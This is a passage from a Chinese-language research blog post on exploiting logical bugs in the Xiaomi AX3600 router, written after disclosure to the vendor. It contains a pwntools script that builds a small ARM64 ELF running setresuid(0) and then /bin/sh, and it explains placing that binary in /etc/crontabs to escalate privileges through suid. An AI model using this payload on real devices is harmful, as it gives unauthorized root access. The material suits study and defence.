<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;critical&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./busybox&#34;</span>

<span class="n">sc</span> <span class="o">=</span>  <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">setresgid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>

<span class="c1"># execve(&#34;/bin/sh&#34;, [&#34;sh&#34;, NULL], NULL)</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;MOV X0, SP&#34;</span><span class="p">)</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&#34;sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;EOR X2, X2, X1&#34;</span><span class="p">)</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;MOV X14, X2&#34;</span><span class="p">)</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;STR X2, [SP, #-16]!&#34;</span><span class="p">)</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;ADD X1, SP, #16&#34;</span><span class="p">)</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;MOV X14, X1&#34;</span><span class="p">)</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;STR X1, [SP, #-16]!&#34;</span><span class="p">)</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;MOV X1, SP&#34;</span><span class="p">)</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;MOV X8, #221&#34;</span><span class="p">)</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;SVC #0&#34;</span><span class="p">)</span>

<span class="n">f</span> <span class="o">=</span> <span class="n">make_elf</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">strip</span> <span class="o">=</span> <span class="bp">True</span><span class="p">,</span> <span class="n">extract</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>最终体积生成符合要求的程序
<img src="../pic/Exploit-AX3600-using-logical-bugs/small_elf.png" alt=""></p>
<p>并打包上传
<img src="../pic/Exploit-AX3600-using-logical-bugs/pack.png" alt=""></p>
<p>这里需要注意，因为 <code>/tmp</code> 挂载的标志位为 <code>nosuid</code>，所以在 <code>/tmp</code> 下运行有 <code>suid</code> 权限的 binary 并不会生效
<img src="../pic/Exploit-AX3600-using-logical-bugs/nosuid.png" alt=""></p>
<p>但可以上传 binary 至 <code>/tmp/spool/cron/crontabs</code> 即 <code>/etc/crontabs</code> 下实现通过 suid 提权 —— 这也是唯一一个突破点</p>
<p><img src="../pic/Exploit-AX3600-using-logical-bugs/suid.png" alt=""></p>
<p><img src="../pic/Exploit-AX3600-using-logical-bugs/lpe.png" alt=""></p>
<p>这个问题在当前的AX3600中并不能称之为安全漏洞，因为AX3600中的所有进程都是以root权限运行的。但 <a href="https://sec.xiaomi.com/">MiSRC</a> 仍然承认了这个问题，并且额外为这个问题支付了漏洞奖金。</p>
<h4 id="q--a-1">Q &amp; A</h4>
<ul>
<li>既然可以在 <code>/etc/crontabs</code> 下上传文件，为什么不在第二个漏洞的利用中直接上传定时任务脚本执行命令？
<ul>
<li><code>/etc/crontabs</code> 下的定时任务脚本对文件名有要求，需和用户名一致才会被 crontab 视为合法的定时任务配置，如文件名必须为 <code>nobody</code> 才可以以 <code>nobody</code> 的身份执行命令。对于第二个漏洞中文件名部分可控的情况下，不满足利用条件</li>
</ul>
</li>
</ul>
<h2 id="后记">后记</h2>
<p>在对AX3600路由器进行研究的过程中，我们发现了十余个逻辑漏洞，并获得了多个CVE编号，组合可以完成多套利用链，本文只分析了其中的一套利用链。如果读者对于其他的漏洞感兴趣，可以参考我们在HITCON 2020的议题 <code>Exploit (Almost) All Xiaomi Routers Using Logical Bugs</code>，在议题中，我们还会展示我们是如何从零开始解固件以及如何解密小米自定义的luac等细节。
扫描二维码可以下载议题slide：
<img src="../pic/Exploit-AX3600-using-logical-bugs/qrcode.png" alt=""></p>
<p>在提交 AX3600 相关漏洞的过程中，收到了 <a href="https://sec.xiaomi.com/">MiSRC</a> 迅速、专业的回复和支持，这里对 <a href="https://sec.xiaomi.com/">MiSRC</a> 表示感谢。</p>
<h2 id="参考资料">参考资料</h2>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/26271959">实战栈溢出：三个漏洞搞定一台路由器</a></li>
<li><a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#alias">nginx alias</a></li>
<li><a href="http://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2010q1/003558.html">[Dnsmasq-discuss] TFTP server - write requests</a></li>
<li><a href="http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html">Man page of DNSMASQ</a></li>
<li><a href="https://sec.xiaomi.com/">MiSRC</a></li>
</ul>
    </div>

    
    


    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="https://bash-c.github.io/tags/exploit/">exploit</a>
          <a href="https://bash-c.github.io/tags/iot/">IoT</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/rwctf-3rd_router3__cve-2020-14104-writeup/">
            
            <i class="iconfont">
              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
</svg>

            </i>
            <span class="prev-text nav-default">RWCTF-3rd router3 &amp; CVE-2020-14104 writeup</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        
          <a class="next" href="/post/perf-in-ctf/">
            <span class="next-text nav-default">Pin in CTF? No, Perf in CTF!</span>
            <span class="prev-text nav-mobile">Next</span>
            
            <i class="iconfont">
              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
</svg>

            </i>
          </a>
      </nav>
    </footer>
  </article>

  
  

  
  

  

  
  
    <div class="post bg-white">
      <script src="https://utteranc.es/client.js"
            repo= "bash-c/bash-c.github.io"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
      </script>
    </div>
  

  

  

  

    

  

        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="icon-links">
  
  
    <a href="mailto:aboultraman@gmail.com" rel="me noopener" class="iconfont"
      title="email" >
      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
</svg>

    </a>
  
    <a href="https://twitter.com/M4x_1997" rel="me noopener" class="iconfont"
      title="twitter"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1264 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M1229.8616 18.043658c0 0-117.852626 63.135335-164.151872 67.344358-105.225559-164.151872-505.082682-92.598492-437.738325 223.078185C278.622548 312.675223 89.216542 47.506814 89.216542 47.506814s-117.852626 189.406006 75.762402 345.139833C127.097743 396.85567 55.544363 371.601535 55.544363 371.601535S26.081207 535.753407 253.368414 615.724832c-21.045112 29.463156-113.643603 8.418045-113.643603 8.418045s25.254134 143.10676 231.496229 180.987961c-143.10676 130.479693-387.230056 92.598492-370.393967 105.225559 206.242095 189.406006 1119.599946 231.496229 1128.01799-643.98042C1179.353331 249.539887 1263.533778 123.269217 1263.533778 123.269217s-130.479693 37.881201-138.897738 33.672179C1225.652577 98.015083 1229.8616 18.043658 1229.8616 18.043658"></path>
</svg>

    </a>
  
    <a href="https://github.com/bash-c" rel="me noopener" class="iconfont"
      title="github"  target="_blank"
      >
      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
</svg>

    </a>


<a href="https://bash-c.github.io/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
    class="iconfont" title="rss" target="_blank">
    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="30" height="30">
  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
</svg>

  </a>
   
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
  </span>

  <span class="copyright-year">
    &copy;
    
       -
    2021
    <span class="heart">
      
      <i class="iconfont">
        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="14" height="14">
  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
   fill="#8a8a8a"></path>
</svg>

      </i>
    </span><span class="author">
        M4x
        
      </span></span>

  
  
    <span id="busuanzi_container">
      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
    </span>
  

  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont">
        
        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="35" height="35">
  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
</svg>

      </i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>




<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>



  <script type="text/javascript">
    window.MathJax = {
      showProcessingMessages: false,
      messageStyle: 'none'
    };
  </script>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML' async></script>









  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  




  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>












</body>
</html>
